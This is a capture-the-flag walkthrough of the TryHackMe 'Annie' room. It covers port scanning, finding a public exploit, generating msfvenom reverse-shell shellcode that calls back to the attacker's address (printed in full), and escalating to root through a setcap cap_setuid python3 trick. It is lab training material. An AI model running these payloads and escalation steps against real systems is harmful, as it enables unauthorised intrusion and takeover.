```http
https://tryhackme.com/room/annie
```

> [!info]
> Remote access comes in different flavors.

___
# Recon
## Nmap

```bash
sudo nmap -p- -T5 -Pn 10.10.10.180  -vv 
```

```resoults
Discovered open port 22/tcp on 10.10.10.180
Discovered open port 7070/tcp on 10.10.10.180
```

```bash
sudo nmap -p22,7070 -sC -sV 10.10.10.180  -O
```

```resoults
PORT     STATE SERVICE     VERSION
22/tcp   open  ssh         OpenSSH 7.6p1 Ubuntu 4ubuntu0.6 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 72:d7:25:34:e8:07:b7:d9:6f:ba:d6:98:1a:a3:17:db (RSA)
|   256 72:10:26:ce:5c:53:08:4b:61:83:f8:7a:d1:9e:9b:86 (ECDSA)
|_  256 d1:0e:6d:a8:4e:8e:20:ce:1f:00:32:c1:44:8d:fe:4e (ED25519)
7070/tcp open  realserver?
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
Running: Linux 4.X
```

___
![annie](https://raw.githubusercontent.com/GooseGusevich/Tryhackme/refs/heads/main/annie/screenshots/20250518010808.png)
___
## serachsploit
```bash
searchsploit realserver 
```

![annie](https://raw.githubusercontent.com/GooseGusevich/Tryhackme/refs/heads/main/annie/screenshots/20250518011049.png)

```
RealServer - Describe Buffer Overflow (Metasploit)                                                    multiple/remote/16286.rb
RealServer 5.0/6.0/7.0 - Memory Contents Disclosure                                                   multiple/remote/20406.txt
RealServer 7-9 - Describe Buffer Overflow (Metasploit)                                                multiple/remote/9937.rb
RealServer < 8.0.2 (Windows Platforms) - Remote Overflow   
windows/remote/23.c
```
___
```http
https://www.exploit-db.com/exploits/16286
```
___
## Search Google
![annie](https://raw.githubusercontent.com/GooseGusevich/Tryhackme/refs/heads/main/annie/screenshots/0250518011510.png)

![annie](https://raw.githubusercontent.com/GooseGusevich/Tryhackme/refs/heads/main/annie/screenshots/0250518011613.png)
![annie](https://raw.githubusercontent.com/GooseGusevich/Tryhackme/refs/heads/main/annie/screenshots/0250518011655.png)

## Maybe exploit
```http
https://www.exploit-db.com/exploits/49613
```
___
# Exploitation

```bash
wget https://www.exploit-db.com/download/49613
```

```bash
chmod +x 49613
```

```bash
msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.9.3.21 LPORT=1337 -b "\x00\x25\x26" -f python -v shellcode
```

```resoults
shellcode =  b""
shellcode += b"\x48\x31\xc9\x48\x81\xe9\xf6\xff\xff\xff\x48"
shellcode += b"\x8d\x05\xef\xff\xff\xff\x48\xbb\xb1\xd5\xf7"
shellcode += b"\xe3\xe6\xc1\xa4\xa3\x48\x31\x58\x27\x48\x2d"
shellcode += b"\xf8\xff\xff\xff\xe2\xf4\xdb\xfc\xaf\x7a\x8c"
shellcode += b"\xc3\xfb\xc9\xb0\x8b\xf8\xe6\xae\x56\xec\x1a"
shellcode += b"\xb3\xd5\xf2\xda\xec\xc8\xa7\xb6\xe0\x9d\x7e"
shellcode += b"\x05\x8c\xd1\xfe\xc9\x9b\x8d\xf8\xe6\x8c\xc2"
shellcode += b"\xfa\xeb\x4e\x1b\x9d\xc2\xbe\xce\xa1\xd6\x47"
shellcode += b"\xbf\xcc\xbb\x7f\x89\x1f\x8c\xd3\xbc\x99\xcc"
shellcode += b"\x95\xa9\xa4\xf0\xf9\x5c\x10\xb1\xb1\x89\x2d"
shellcode += b"\x45\xbe\xd0\xf7\xe3\xe6\xc1\xa4\xa3"
```

![annie](https://raw.githubusercontent.com/GooseGusevich/Tryhackme/refs/heads/main/annie/screenshots/0250518012850.png)
### Check problem
![annie](https://raw.githubusercontent.com/GooseGusevich/Tryhackme/refs/heads/main/annie/screenshots/0250518013507.png)
![annie](https://raw.githubusercontent.com/GooseGusevich/Tryhackme/refs/heads/main/annie/screenshots/0250518013905.png)

![annie](https://raw.githubusercontent.com/GooseGusevich/Tryhackme/refs/heads/main/annie/screenshots/0250518014143.png)

![annie](https://raw.githubusercontent.com/GooseGusevich/Tryhackme/refs/heads/main/annie/screenshots/250518015249.png)

![annie](https://raw.githubusercontent.com/GooseGusevich/Tryhackme/refs/heads/main/annie/screenshots/250518015157.png)

> [!warning]
> It turns out that the connection is accepted with UDP). In the exploit, only change the shellcode and IP

![annie](https://raw.githubusercontent.com/GooseGusevich/Tryhackme/refs/heads/main/annie/screenshots/250518015920.png)
___
# LPE

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

![annie](https://raw.githubusercontent.com/GooseGusevich/Tryhackme/refs/heads/main/annie/screenshots/0250518020402.png)

## SUID
```bash
find / -type f -perm -4000 2>/dev/null
```

```bash
cp /usr/bin/python3 /home/annie/python3
```

```bash
setcap cap_setuid+ep /home/annie/python3
```

```bash
./python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'
```
